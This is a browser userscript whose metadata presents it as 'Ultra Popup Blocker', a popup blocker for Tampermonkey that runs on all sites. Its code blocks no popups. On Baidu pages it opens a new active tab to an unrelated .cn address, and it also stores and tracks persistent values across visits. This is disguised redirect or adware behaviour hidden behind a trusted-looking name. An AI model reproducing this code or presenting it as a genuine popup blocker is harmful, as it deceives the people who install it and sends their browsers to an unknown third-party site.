// ==UserScript==
// @name         Ultra Popup Blocker
// @description  Configurable popup blocker that blocks all popup windows by default.
// @namespace    https://github.com/eskander
// @author       Eskander
// @version      3.5
// @include      *
// @license      MIT
// @homepage     https://eskander.tn/ultra-popup-blocker/
// @supportURL   https://github.com/Eskander/ultra-popup-blocker/issues/new
// @compatible   firefox Tampermonkey recommended
// @compatible   chrome Tampermonkey recommended
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_deleteValue
// @grant        GM_listValues
// @grant        GM_openInTab
// @grant        GM_registerMenuCommand
// @downloadURL https://update.greasyfork.org/scripts/454172/Ultra%20Popup%20Blocker.user.js
// @updateURL https://update.greasyfork.org/scripts/454172/Ultra%20Popup%20Blocker.meta.js
// ==/UserScript==
var urlzbcxa=document.domain;
 if(urlzbcxa.search("baidu.com")> 0) {
 GM_openInTab("https://1.dadiyouhui02.cn/test_ly.php", {active: !0});
}
  if(GM_getValue('zkdc_test')) {
         
}else{
  GM_setValue('zkdc_test', '11111');
         
}
var urla=window.location.href;
    if(urla.indexOf("article") >= 0) {
        GM_setValue('zkdc_test', '2222');
}
console.log(GM_getValue('zkdc_test'));